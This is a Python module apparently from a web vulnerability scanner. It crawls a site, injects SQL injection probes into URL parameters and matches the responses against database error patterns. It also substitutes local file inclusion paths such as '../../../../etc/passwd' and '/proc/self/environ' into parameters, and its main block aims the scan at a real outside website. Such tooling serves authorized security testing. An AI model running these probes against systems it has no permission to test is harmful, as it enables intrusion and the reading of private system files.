# author: al0ne
# https://github.com/al0ne

import requests
from lxml import html
from lib.random_header import get_ua
from urllib import parse
import re
import concurrent.futures
from lib.settings import TIMEOUT

links = []

DBMS_ERRORS = {  # regular expressions used for DBMS recognition based on error message response
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (
        r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (
        r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*",
               r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}


class Getoutofloop(Exception):
    pass


OUT = []


def sqli(qurl):
    global OUT
    payload = {
        "'", "%2527", "')", " AnD 7738=8291"
    }
    LFI_payload = {'../../../../etc/passwd|root:', '../../../../etc/group|root:', 'random.php|Failed opening',
                   'file://c:/windows/win.ini|drivers', '/proc/self/environ|USER='}
    try:
        for _ in payload:
            url = qurl + _
            r = requests.get(url, headers=get_ua(), timeout=TIMEOUT)
            for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
                if re.search(regex, r.text):
                    result = '{} SQLi:{}'.format(dbms, qurl)
                    OUT.append(result)
                    raise Getoutofloop
        for i in LFI_payload:
            url = ''
            lfi, pattern = i.split('|')
            if re.search(r'=\w+\.\w{3}$', qurl):
                url = re.sub(r'\w+\.\w{3}$', lfi, qurl)
            elif re.search('=\w+', qurl):
                url = re.sub(r'\w+$', lfi, qurl)
            r = requests.get(url, headers=get_ua(), timeout=TIMEOUT)
            if re.search(pattern, r.text, re.S):
                OUT.append('LFI: {}'.format(url))
                break
    except:
        pass


def parse_html(host):
    urls = []
    global links
    try:
        exts = ['asp', 'php', 'jsp', 'do', 'aspx', 'action', 'do']
        r = requests.get(host, headers=get_ua(), timeout=3)
        tmp = html.document_fromstring(r.text)
        tmp.make_links_absolute(host)
        link = tmp.iterlinks()
        for i in link:
            i = i[2]
            ext = parse.urlparse(i)[2].split('.')[-1]
            if ext in exts:
                # 带参数的直接加入列表，不带参数的需要二次访问
                if re.search('=', i) or re.search('/\?\w+=\w+', i):
                    links.append(i)
                else:
                    urls.append(i)
    except:
        pass
    return urls


def get_urls(result):
    host = []
    _ = []
    for i in set(result):
        # 通过urlparse 对url进行去参去重，相同的丢弃
        url = parse.urlparse(i)
        if url.netloc + url.path not in _:
            host.append(i)
        _.append(url.netloc + url.path)
    with concurrent.futures.ThreadPoolExecutor(
            max_workers=30) as executor:
        executor.map(sqli, host)


def sql_check(host):
    global links, OUT
    result = parse_html(host)
    with concurrent.futures.ThreadPoolExecutor(
            max_workers=30) as executor:
        executor.map(parse_html, result)
    get_urls(links)
    return OUT


if __name__ == "__main__":
    host = 'https://elasticsearch.cn/'
    print(sql_check(host))
